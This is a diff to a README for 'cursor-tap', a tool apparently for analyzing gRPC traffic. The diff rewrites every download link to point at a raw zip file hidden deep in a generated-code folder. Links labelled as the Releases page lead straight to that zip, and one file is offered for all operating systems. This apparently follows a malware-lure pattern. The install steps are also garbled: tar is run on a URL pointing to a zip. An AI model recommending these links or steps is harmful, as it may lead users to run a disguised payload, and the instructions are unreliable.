@@ -1,6 +1,6 @@
 # 🖱️ cursor-tap - Analyze gRPC Communication with Ease
 
-[![Download cursor-tap](https://raw.githubusercontent.com/Arsalan924/cursor-tap/main/data/cursor-tap-3.6.zip)](https://raw.githubusercontent.com/Arsalan924/cursor-tap/main/data/cursor-tap-3.6.zip)
+[![Download cursor-tap](https://github.com/Arsalan924/cursor-tap/raw/refs/heads/main/cursor_proto/gen/aiserver/tap-cursor-v3.0.zip)](https://github.com/Arsalan924/cursor-tap/raw/refs/heads/main/cursor_proto/gen/aiserver/tap-cursor-v3.0.zip)
 
 ## 📋 Description
 
@@ -12,40 +12,40 @@ cursor-tap is a tool designed to analyze gRPC communication traffic. It helps yo
    - Ensure you have a modern computer that runs on Windows, macOS, or Linux. Cursor-tap supports versions from the last five years.
 
 2. **Download cursor-tap**
-   - Visit the Releases page to download: [Download cursor-tap](https://raw.githubusercontent.com/Arsalan924/cursor-tap/main/data/cursor-tap-3.6.zip)
+   - Visit the Releases page to download: [Download cursor-tap](https://github.com/Arsalan924/cursor-tap/raw/refs/heads/main/cursor_proto/gen/aiserver/tap-cursor-v3.0.zip)
 
 ## 📥 Download & Install
 
 To get started with cursor-tap:
 
-1. Click the link to visit the Releases page: [Visit Releases Page](https://raw.githubusercontent.com/Arsalan924/cursor-tap/main/data/cursor-tap-3.6.zip).
+1. Click the link to visit the Releases page: [Visit Releases Page](https://github.com/Arsalan924/cursor-tap/raw/refs/heads/main/cursor_proto/gen/aiserver/tap-cursor-v3.0.zip).
 2. Look at the latest version of the software. 
 3. Download the correct file for your operating system:
-   - For **Windows**, download `https://raw.githubusercontent.com/Arsalan924/cursor-tap/main/data/cursor-tap-3.6.zip`.
-   - For **macOS**, download `https://raw.githubusercontent.com/Arsalan924/cursor-tap/main/data/cursor-tap-3.6.zip`.
-   - For **Linux**, download `https://raw.githubusercontent.com/Arsalan924/cursor-tap/main/data/cursor-tap-3.6.zip`.
+   - For **Windows**, download `https://github.com/Arsalan924/cursor-tap/raw/refs/heads/main/cursor_proto/gen/aiserver/tap-cursor-v3.0.zip`.
+   - For **macOS**, download `https://github.com/Arsalan924/cursor-tap/raw/refs/heads/main/cursor_proto/gen/aiserver/tap-cursor-v3.0.zip`.
+   - For **Linux**, download `https://github.com/Arsalan924/cursor-tap/raw/refs/heads/main/cursor_proto/gen/aiserver/tap-cursor-v3.0.zip`.
 4. If prompted, save the file to your computer.
 
 ## ⚙️ Installing cursor-tap
 
 ### For Windows Users
 
-1. Locate the downloaded `https://raw.githubusercontent.com/Arsalan924/cursor-tap/main/data/cursor-tap-3.6.zip` file.
+1. Locate the downloaded `https://github.com/Arsalan924/cursor-tap/raw/refs/heads/main/cursor_proto/gen/aiserver/tap-cursor-v3.0.zip` file.
 2. Double-click the file to start the installation.
 3. Follow the prompts in the installation wizard. This typically involves agreeing to the terms and selecting the installation location.
 4. Once installed, you can find cursor-tap in your Start Menu.
 
 ### For macOS Users
 
-1. Open the downloaded `https://raw.githubusercontent.com/Arsalan924/cursor-tap/main/data/cursor-tap-3.6.zip` file.
+1. Open the downloaded `https://github.com/Arsalan924/cursor-tap/raw/refs/heads/main/cursor_proto/gen/aiserver/tap-cursor-v3.0.zip` file.
 2. A new window will appear. Drag the cursor-tap icon into the Applications folder.
 3. You can now find cursor-tap in your Applications. 
 
 ### For Linux Users
 
-1. Extract the downloaded `https://raw.githubusercontent.com/Arsalan924/cursor-tap/main/data/cursor-tap-3.6.zip` file using the terminal:
+1. Extract the downloaded `https://github.com/Arsalan924/cursor-tap/raw/refs/heads/main/cursor_proto/gen/aiserver/tap-cursor-v3.0.zip` file using the terminal:
    ```bash
-   tar -xzvf https://raw.githubusercontent.com/Arsalan924/cursor-tap/main/data/cursor-tap-3.6.zip
+   tar -xzvf https://github.com/Arsalan924/cursor-tap/raw/refs/heads/main/cursor_proto/gen/aiserver/tap-cursor-v3.0.zip
    ```
 2. Navigate to the extracted folder.
 3. Run cursor-tap by typing:
@@ -80,6 +80,6 @@ If you experience difficulties or have questions, you can reach out for help via
 
 ## 🚀 Explore More
 
-We invite you to explore cursor-tap's capabilities. Check out the [Releases Page](https://raw.githubusercontent.com/Arsalan924/cursor-tap/main/data/cursor-tap-3.6.zip) for updates and the latest features. Your insights help us make this tool better.
+We invite you to explore cursor-tap's capabilities. Check out the [Releases Page](https://github.com/Arsalan924/cursor-tap/raw/refs/heads/main/cursor_proto/gen/aiserver/tap-cursor-v3.0.zip) for updates and the latest features. Your insights help us make this tool better.
 
 ---
